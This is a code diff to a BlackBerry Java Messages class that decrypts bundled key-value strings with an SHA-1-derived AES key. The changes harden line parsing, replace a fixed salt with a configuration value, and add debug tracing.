@@ -6,6 +6,7 @@ import java.util.Hashtable;
 
 import net.rim.device.api.crypto.SHA1Digest;
 import net.rim.device.api.i18n.MissingResourceException;
+import blackberry.config.Cfg;
 import blackberry.crypto.EncryptionPKCS5;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -60,12 +61,28 @@ public class Messages {
                 }
                 posMessages += currentLine.length() + 1;
 
-                String[] kv = StringUtils.split(StringUtils.chop(currentLine), "=");
+                String[] kv = StringUtils.splitFirst(
+                        StringUtils.chop(currentLine), "=");
                 //#ifdef DBC
                 Check.asserts(kv.length == 2, "wrong number of tokens");
                 //#endif
 
+                if (kv.length != 2) {
+                    //#ifdef DEBUG
+                    debug.error("init len: " + kv.length);
+                    //#endif
+                    continue;
+                }
+
+                //#ifdef DBC
+                Check.asserts(!messages.contains(kv[0]), "key already present: "
+                        + kv[0]);
+                //#endif
+
                 messages.put(kv[0], kv[1]);
+                //#ifdef DEBUG
+                debug.trace(kv[0] + " -> " + kv[1]);
+                //#endif
             }
 
             initialized = true;
@@ -81,11 +98,11 @@ public class Messages {
 
     }
 
-
-
     public static String getString(String key) {
         if (!initialized) {
-            init();
+            if (!init()) {
+                return null;
+            }
         }
         try {
             //#ifdef DBC
@@ -119,7 +136,7 @@ public class Messages {
             debug.trace("produceKey key: " + key + " " + key.length());
             //#endif
 
-            String salt = "sale";
+            String salt = Cfg.RANDOM;
 
             final SHA1Digest digest = new SHA1Digest();
 
@@ -134,6 +151,9 @@ public class Messages {
             byte[] aes_key = new byte[16];
             System.arraycopy(sha1, 0, aes_key, 0, aes_key.length);
 
+            //#ifdef DEBUG
+            debug.trace("produceKey: " + Utils.byteArrayToHex(aes_key));
+            //#endif
             return aes_key;
         } catch (Exception e) {
             //#ifdef DEBUG
